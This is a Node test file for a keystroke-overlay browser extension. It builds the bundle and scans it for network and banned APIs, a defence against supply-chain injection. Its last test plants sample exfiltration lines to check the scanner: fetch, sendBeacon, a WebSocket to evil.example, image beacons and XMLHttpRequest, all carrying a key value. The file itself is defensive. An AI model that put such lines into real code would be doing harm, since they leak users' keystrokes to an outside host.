// Scans what actually ships. The source scan can't see code that the build
// tools add to content.js (a compromised esbuild, or a dependency bundled by
// accident), so this builds the extension fresh and scans every file in it.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, relative } from 'node:path';
import { buildExtension } from '../../scripts/build.js';
import { findBanned, walk } from './banned.js';

let outDir;
let files = [];

before(async () => {
  outDir = await buildExtension(await mkdtemp(join(tmpdir(), 'key-overlay-build-')));
  for await (const f of walk(outDir)) files.push(f);
});

after(async () => {
  if (outDir) await rm(outDir, { recursive: true, force: true });
});

test('the build produces the bundled content script', () => {
  assert.ok(files.some((f) => relative(outDir, f) === 'content.js'), 'content.js is missing from the build');
});

test('every built file uses no banned or network APIs', async () => {
  const report = [];
  for (const file of files) {
    const hits = findBanned(await readFile(file, 'utf8'));
    if (hits.length) report.push(`${relative(outDir, file)}:\n${hits.join('\n')}`);
  }
  assert.equal(report.length, 0, `banned APIs in the build:\n${report.join('\n')}`);
});

test('the bundle contains only our own modules', async () => {
  // Nothing from node_modules gets pulled into the bundle.
  const bundle = await readFile(join(outDir, 'content.js'), 'utf8');
  assert.doesNotMatch(bundle, /node_modules/);
});

test('the scan catches network calls planted in the bundle', async () => {
  const bundle = await readFile(join(outDir, 'content.js'), 'utf8');
  const planted = [
    'fetch("/collect?k=" + key);',
    'navigator.sendBeacon("/k", key);',
    'new WebSocket("wss://evil.example");',
    'new Image().src = "/p?k=" + key;',
    'img.src = "/p?k=" + key;',
    'new RTCPeerConnection();',
    'el.setAttribute("src", "/p?k=" + key);',
    'background: url(/p?k=a);',
    'new XMLHttpRequest();',
  ];
  for (const line of planted) {
    assert.ok(findBanned(`${bundle}\n${line}`).length > 0, `not caught: ${line}`);
  }
});
